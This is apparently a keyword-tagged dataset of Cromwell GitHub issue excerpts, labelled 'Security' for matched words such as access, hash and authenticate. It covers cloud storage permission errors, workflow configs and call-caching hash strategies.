gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11678,access,access,11678,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12932,access,access,12932,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14186,access,access,14186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," first task cannot be 'linked' or 'copied'. This cause the workflow to fail. The interesting part is that in the input folder of the second task there are two subfolders: 1 is empty named as `13016223` and the other is not accessible `-1976550098`. The workflow to run needs installed:; `cutadapt` and the script named `moveBarcodeToID.pl` that can be downloaded from here:. https://drive.google.com/open?id=1AizxTwjOEhL5XA7rsx-wbY97p0duB1nw. input fastq files can be retrieved here (they are small ~10000 reads each):. https://drive.google.com/file/d/1-c14Tja4zY3lyr6icFWT06stznR_-Zqr/view?usp=sharing; https://drive.google.com/file/d/1oJd_U9MjTllL0_kpNivw8I_LtSyvqpXH/view?usp=sharing. How can I solve this issue and make the workflow running smoothly?. ### Which backend are you running? ; I am running locally the workflow for now (because I am in the first phase of the development). ### Workflow is this:; ```; #workflow validated before running with: wdltool validate example.wdl and womtool validate scMeth_v2.wdl.sh -i scMeth_input_3.json. workflow scMeth {; # information for trimming the cell barcode; File command; Int bases; File input_fastq1; File input_fastq2; String sampleName. # information for trimming the adapters and low quality reads; File file_format; Int low_quality_cutoff; Int read_length_cutoff; String adapters_1; String adapters_2; Int trim_start_R1; Int trim_end_R1; Int trim_start_R2; Int trim_end_R2; String TAG; call trimCellBarcode {; input:; sampleName=sampleName,; bases=bases,; input_fastq1=input_fastq1,; input_fastq2=input_fastq2,; command=command; }; call trimAdapters {; input:; file_format=file_format,; input_r1 = trimCellBarcode.fastq_debarcoded_R1,; input_r2 = trimCellBarcode.fastq_debarcoded_R2,; low_quality_cutoff=low_quality_cutoff,; read_length_cutoff=read_length_cutoff,; adapters_1=adapters_1,; adapters_2=adapters_2,; trim_start_R1=trim_start_R1,; trim_end_R1=trim_end_R1,; trim_start_R2=trim_start_R2,; trim_end_R2=trim_end_R2,; TAG=TAG; }; }. t",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5066:1263,validat,validate,1263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5066,1,['validat'],['validate']
Security," for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; // This allows you to use an alternative service account to launch jobs, by default uses default service account; compute-service-account = ""default""; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""project-test1""; }; }; }; }; }; }; ```. I created the service account from https://cloud.google.com/docs/authentication/getting-started and give the role: Project -> Owner. I've downloaded Google Cloud SDK and run these; ```; gcloud auth login juha.wilppu@gmail.com; gcloud auth application-default login; gcloud config set project project-test1; gsutil ls gs://project-test1 // This command works, so authentication is successful.; ```; **project-test1-59b66448c3ab.json**; ```; {; ""type"": ""service_account"",; ""project_id"": ""project-test1"",; ""private_key_id"": ""59b66448c3ab730097135e1dba83b375a6b57ea3"",; ""private_key"": ""-----BEGIN PRIVATE KEY-----\n(Omitted)\n-----END PRIVATE KEY-----\n"",; ""client_email"": ""project-service@project-test1.iam.gserviceaccount.com"",; ""client_id"": ""104927211954691424974"",; ""auth_uri"": ""https://accounts.google.com/o/oauth2/auth"",; ""token_uri"": ""https://accounts.google.com/o/oauth2/token"",; ""auth_provider_x509_cert_url"": ""https://www.googleapis.com/oauth2/v1/certs"",; ""client_x509_cert_url"": ""https://www.googleapis.com/robot/v1/metadata/x509/project-service%40project-test1.iam.gserviceaccount.com""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3690:5842,authenticat,authentication,5842,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3690,1,['authenticat'],['authentication']
Security," for workflows that contain branches that rejoin (and most do). . ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334536133). I think this comment is more appropriate here:. Equals is supposed to be bitwise/value-based equality, whereas `eq` indicates reference equality. I don't recall the exact motivation behind using `eq` in the test, maybe @cjllanwarne can comment when he returns on Tuesday. ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334555964). If you don't like this fix, what do you suggest we do instead? How about we accept this fix now and you can rework the whole thing later, if you want?. This is a show-stopper once you want to create larger (aka real-life) workflows. . For example: if node a has two outputs, which are inputs of b, then b.hashCode calls a.hasCode twice. If b produces two outputs which are inputsof c, then c.hashCode calls b.hashCode twice, and a.hashCode is called four times. If c produces two outputs which are inputs of d, d.hashCode calls c.hashCode twice, b.hashCode four times and a.hashCode eight times, etc. . ---. @curoli commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334557027). `eq` is object equality. `equals` and `==` are the same, and there is no general rule that they need to be component-based (""bitwise""). On the contrary, `equals`/`==` should not be component-based if an object is mutable. Your typical GraphNode is mutable, because it indirectly contains `GraphNodeSetter`. ---. @danbills commented on [Thu Oct 05 2017](https://github.com/broadinstitute/wdl4s/issues/248#issuecomment-334575875). I suggest we leave this as-is with the understanding that it could be a performance issue down the road. . >rework the whole thing later. This is a specific anti-goal. As I suggested, I would like to discuss w/ Chris when he gets back next week as we introduced the re",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2694:1713,hash,hashCode,1713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2694,2,['hash'],['hashCode']
Security, greater than 0; cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCachingActorHelper.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.startMetadataKeyValues(AwsBatchAsyncBackendJobExecutionActor.scala:362); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:942); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:935); 	at cromwell.backend.impl.aws.AwsBatchAsyncBac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:1608,validat,validatedRuntimeAttributes,1608,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validatedRuntimeAttributes']
Security," if you have any questions; slurm {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; # Root directory where Cromwell writes job results in the container. This value; # can be used to specify where the execution folder is mounted in the container.; # it is used for the construction of the docker_cwd string in the submit-docker; # value above.; dockerRoot = ""/cromwell-executions"". concurrent-job-limit = 10; # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; ## Warning: If set, Cromwell will run 'check-alive' for every job at this interval; exit-code-timeout-seconds = 360; filesystems {; local {; localization: [; # soft link does not work for docker with --contain. Hard links won't work; # across file systems; ""copy"", ""hard-link"", ""soft-link""; ]; caching {; duplication-strategy: [""copy"", ""hard-link"", ""soft-link""]; hashing-strategy: ""file""; }; }; }. #; runtime-attributes = """"""; Int runtime_minutes = 600; Int cpus = 3; Int requested_memory_mb_per_core = 8000; Int memory_mb = 40000; String? docker; String? partition; String? account; String? IMAGE; """""". submit = """"""; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; # SINGULARITY_CACHEDIR needs to point to a directory accessible by; # the jobs (i.e. not lscratch). Might want to use a workflow local; # cache dir like in run.sh; source /work/share/ac7m4df1o5/bin/cromwell/set_singularity_cachedir.sh; SINGULARITY_CACHEDIR=/work/share/ac7m4df1o5/bin/cromwell/singularity-cache; source /work/share/ac7m4df1o5/bin/cromwell/test.sh ${docker}; echo ""SINGULARITY_",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:7173,hash,hashing-strategy,7173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['hash'],['hashing-strategy']
Security," latest, and you can change this behavior by defining `DOCKER_TAG` either in the config or circle environment (I don't see a reason to do this). Note that deploy is ONLY set up to happen on pushes to master (and you can change this to also be develop, if you choose, or to be both and then to deploy to tags `<branch>-<commit>` or something like that. ## Background; This was first done at the repo [vsoch/cromwell](https://github.com/vsoch/cromwell/pull/1) to test since I can't set it up for the broadinstitute. The (finally) working test is at [https://circleci.com/gh/vsoch/cromwell/11](https://circleci.com/gh/vsoch/cromwell/11). I forgot that I can't have volumes, so it took me many tries to remember this, derp :P . When adding to the repository here, the following additional work will be needed for setup:. - Turn on the repository to build at circleci. The first build, since there is no `.circici/config.yml` will probably just yell at you for having ""Version 1.0"" or not finding a config.; - You will want to turn on building forked pull requests in the settings; - Under environment variables, define the following:; - `DOCKER_USER` should be the user to authenticate pushing; - `DOCKER_PASS` password for that user (**important** do not turn on also testing of forked pull requests on their branch (different setting from above) as this could compromise these credentials.; - `CONTAINER_NAME` should be something like `broadinstiutute/cromwell-dev`. - The tag will always build the commit id, and then latest. If you want to change this behavior, define `DOCKER_TAG`.; - ensure the branch logic (when things are triggered) is to your liking.; - update the repo badge to be cromwell here and not on vsoch (after you connect the two!). I noticed that there is no sbt version set (in some config file) - would this make sense to do?. ```bash; [warn] No sbt.version set in project/build.properties, base directory: /; [info] Set current project to root (in build file:/); [info] 1.2.1; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015:2277,authenticat,authenticate,2277,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015,2,"['authenticat', 'password']","['authenticate', 'password']"
Security," md5 hash of the file content. [Code: `tryWithResource(() => file.newInputStream) { DigestUtils.md5Hex }`]; - `path` - computes an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"".; - `path+modtime` - compute an md5 hash of the file path and the last modified time. The same conditions as for ""path"" apply here. [Code: `md5Hex(file.toAbsolutePath.pathAsString + file.lastModifiedTime.toString)`]. Other caching options:. - `system.file-hash-cache` - Prevent repeatedly requesting the hashes of the same files multiple times. - `backend.providers.Local.caching.check-sibling-md5` - will check if a sibling file with the same name and the .md5 extension exists, and if it does, use the content of this file as a hash. ## My takeaway. - I can't use a `softlink` cache duplication strategy as it's not allowed for containers. - If I select the `path+modtime` hashing strategy, only the first task in a workflow will succeed, as the hard-link duplication strategy will cause the path ""absolute"" be different (causing a hash differential). ## Questions. - ~What defines a cache hit, or exactly which information is used to the call hash?~; > I'll answer this one myself, by looking at the metadata returned from `/api/workflows/{version}/{id}/metadata`, within the `calls.$yourstepname.callCaching`, the hashes field has the following attributes:; > - `output count`; > - `runtime attribute`; > - `output expression`; > - `input count`; > - `backend name`; > - `command template`; > - `input`. - ~When does the command section get hashed (before or after replacements)?~; > The template gets cached. - ~What other elements go into the building the cache?~; > output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers wi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:2240,hash,hashing,2240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,2,['hash'],"['hash', 'hashing']"
Security," message always results in the same hash; 2. it is quick to compute the hash value for any given message; 3. it is infeasible to generate a message that yields a given hash value; 4. it is infeasible to find two different messages with the same hash value; 5. a small change to a message should change the hash value so extensively that the new hash value appears uncorrelated with the old hash value (avalanche effect). I contest point 2, in that many cryptographic explicitly strife for being slow to calculate in order to negate brute force attempts.; Anyway: for call caching we only need points 1. and 4. All the rest is unnecessary ballast. . ## xxHash; Luckily there is a hashing algorithm that is designed explicitly for content hashing only. It was made to generate reliably different hashes for file content as fast as possible. It's called [xxHash](https://www.xxhash.com). There are Java implementations available and I did [some extensive benchmarking](https://github.com/rhpvorderman/hashtest/) to find out which one was best. The xxh64 (xxhash for 64 bit machines) algorithm was 15 times faster than the java implementation of md5 we currently use in Cromwell. This PR implements the xxhash algorithm for call-caching in Cromwell:. + The default strategy will still be using md5 for backwards compatibility.; + A new `xxh64` strategy is implemented using the 64-bit xxhash algorithm. (I didn't make the xxh32 algorithm available. Is there any Cromwell server still running on 32-bit?) This can be set in the call caching configuration.; + A new `fingerprint` strategy suggested by @illusional, which takes the modtime, size and a xxh64 hash of the first 10 mb of the file to create a virtually unique fingerprint.; + The `file` strategy get's a new alias `md5` which is more clear. Although `file` will still work in the config for backwards compatibility. . I feel we should move to xxh64 as default after it has proven itself in a few releases. The speed-up is an order of magnitude.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450:2147,hash,hashtest,2147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450,2,['hash'],"['hash', 'hashtest']"
Security," output count, runtime attribute, output expression, input count, backend name, command template, input. - What are the downsides with `check-sibling-md5`, can it be used in conjunction with `system.file-hash-cache`. - **Is the only way to use call-caching with containers without fully hashing the file?**. ## Possible resolutions. I was thinking the following might be potential solutions for my problem, but I don't know how good / bad they are, and they'd require changes to Cromwell. - Potential for a _cheaper_ (and potentially dirtier) hash for files? ; - When cromwell links from a cached result, store a map of { newpath : original } link to use or call caching, so when the hashDifferential is calculated, it uses the hash of the original cached result. (This would mean we could use the path+modtime strategy). ## Current attempt. I realised I may have run into another error here: https://github.com/broadinstitute/cromwell/issues/5348. This is my current configuration, it will successfully pull cache for the FIRST step in a workflow, but then fail afterwards. <details><summary>Click to show configuration</summary><p>. ```hocon; include required(classpath(""application"")). system: {; ""job-shell"": ""/bin/sh"",; ""cromwell_id"": ""cromwell-fdcce1"",; ""cromwell_id_random_suffix"": false; }; database: {; ""db"": {; ""driver"": ""com.mysql.cj.jdbc.Driver"",; ""url"": ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true&useSSL=false&serverTimezone=UTC"",; ""user"": ""root"",; ""connectionTimeout"": 5000; },; ""profile"": ""slick.jdbc.MySQLProfile$""; }; backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""/Users/franklinmichael/janis/cache_test/20200110_090106_f8ee04/janis/execution"",; ""filesystems"": {; ""local"": {; ""caching"": {; ""hashing-strategy"": ""path+modtime""; }; }; }; }; }; }; }; call-caching: {; ""enabled"": true; }; ```; </p></details>. Thanks in advance for your help!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346:4891,hash,hashing-strategy,4891,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346,1,['hash'],['hashing-strategy']
Security," output_bam = ""~{name}.bam""; File output_bai = ""~{name}.bai"". }; }; ```. input:; ```; {; ""Mutect2.tumor_reads"": ""sra://SRR2619134/SRR2619134""; }; ```. wdl:; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; filesystems {; sra {; class = ""cromwell.filesystems.sra.SraPathBuilderFactory""; docker-image = ""fusera/fusera:alpine""; ngc = ""/home/nicholas/.sra/prj_26387_D28121.ngc""; }; }; engine {; filesystems {; gcs {; auth = ""application-default""; }. }; }; backend {; default = PAPIv2; providers {; PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; concurrent-job-limit = 10000; max-concurrent-workflows = 10000; genomics-api-queries-per-100-seconds = 10000; maximum-polling-interval = 300; max-workflow-launch-count = 2000; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; enable-fuse = true; }; filesystems {; sra {}; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 12800000; json = 12800000; tsv = 12800000; map = 12800000; object = 12800000; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161:3631,access,access,3631,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804#issuecomment-682146161,1,['access'],['access']
Security," potential there, but mostly because workflow backbones; have complex requirements, and trying to fit a new tool to them that wasn't; made for it in the first place is not trivial. Moving Singularity out of the role of the backend and into the role of a; workflow component, more specifically a container that understands its; data, also introduces the room to give it its own subfunctions, variables,; metadata, tags, etc. This makes the starting point plainly obvious. You can just take the; location where you mention the location of the executable, and put the; wrapper to your singularity image there. I bet this is what most people do; anyway. A next step would be to give it its own section within the workflow; components. Maybe the comment of oneillkza is a high impact one, just; define Singularity as a CAP/ISOblablabla compliant workflow component; within Cromwell. Another take (and not per se mutually exclusive from the take mentioned; above) would be to, again, fix Singularity as a workflow component, and; create a set of options and functions around it that focus on abstraction; of data access etcetera. Very curious where this will go, and thanks so much Vanessa for rethinking; the approach!. Gr. Pim. On Tue, Aug 28, 2018 at 3:12 AM Vanessa Sochat <notifications@github.com>; wrote:. > Hey everyone!; >; > I've been thinking more about this and testing, and I want to offer my; > thoughts here.; > I think overall my conclusions are:; >; > - We are trying to shove Singularity in as a backend *and* a workflow; > component, it's one or the other; > - It's probably more appropriately the latter - a command you would; > put into a workflow (e.g., like python, any binary really) because services; > and standards (OCI) aren't fully developed.; > - The time is soon, but it's not now, to define a Singularity backend; > - For now, give users examples of just using containers as; > executables, nothing special.; >; > TLDR let's not try shoving a dog into a cat hole because the",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:1747,access,access,1747,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['access'],['access']
Security, preemptible: true; zones:; - us-central1-b; - us-central1-c; pipelineArgs:; clientId: ''; inputs:; exec: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/exec.sh; input_bam-0: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-SortAndFixReadGroupBam/shard-22/HTC3GCCXX.8.Pond-536132.sorted.bam; ref_dict-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.dict; ref_fasta-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta; ref_fasta_index-0: gs://broad-references/hg38/v0/Homo_sapiens_assembly38.fasta.fai; logging:; gcsPath: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22.log; outputs:; HTC3GCCXX.8.Pond-536132.validation_report: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/HTC3GCCXX.8.Pond-536132.validation_report; ValidateReadGroupSamFile-22-rc.txt: gs://broad-gotc-int-cromwell-execution/PairedEndSingleSampleWorkflow/4d02d218-b473-4a88-8820-964da7e508c4/call-ValidateReadGroupSamFile/shard-22/ValidateReadGroupSamFile-22-rc.txt; projectId: broad-gotc-int; resources:; bootDiskSizeGb: 0; disks: []; minimumCpuCores: 0; minimumRamGb: 0; noAddress: false; preemptible: false; zones: []; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/genomics; - https://www.googleapis.com/auth/compute; runtimeMetadata:; '@type': type.googleapis.com/google.genomics.v1alpha2.RuntimeMetadata; computeEngine:; diskNames:; - local-disk-12146155240789544851; instanceName: ggp-12146155240789544851; machineType: us-central1-b/n1-standard-2;,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1501:4201,Validat,ValidateReadGroupSamFile,4201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1501,1,['Validat'],['ValidateReadGroupSamFile']
Security," request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; page_size: 100; requestMetadata:; callerIp: 64.112.179.105; callerSuppliedUserAgent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101; Firefox/80.0,gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T03:28:37.843325531Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T03:28:38.742413691Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T03:28:37.734190692Z'; ```. Sometimes like this instead:; ```; insertId: 1mk6qq6ek68fs; logName: projects/mccarroll-mocha/logs/cloudaudit.googleapis.com%2Fdata_access; protoPayload:; '@type': type.googleapis.com/google.cloud.audit.AuditLog; authenticationInfo:; principalEmail: google@broadinstitute.com; principalSubject: user:google@broadinstitute.com; authorizationInfo:; - granted: true; permission: iam.serviceAccounts.list; resource: projects/mccarroll-mocha; resourceAttributes: {}; methodName: google.iam.admin.v1.ListServiceAccounts; request:; '@type': type.googleapis.com/google.iam.admin.v1.ListServiceAccountsRequest; name: projects/mccarroll-mocha; requestMetadata:; callerIp: 69.173.70.180; callerSuppliedUserAgent: (gzip),gzip(gfe); destinationAttributes: {}; requestAttributes:; auth: {}; time: '2020-09-03T11:58:49.543410910Z'; resourceName: projects/mccarroll-mocha; serviceName: iam.googleapis.com; status: {}; receiveTimestamp: '2020-09-03T11:58:49.691467944Z'; resource:; labels:; location: global; method: google.iam.admin.v1.ListServiceAccounts; project_id: mccarroll-mocha; service: iam.googleapis.com; version: v1; type: api; severity: INFO; timestamp: '2020-09-03T11:58:49.452628092Z'; ```. The principalEmail sometimes is 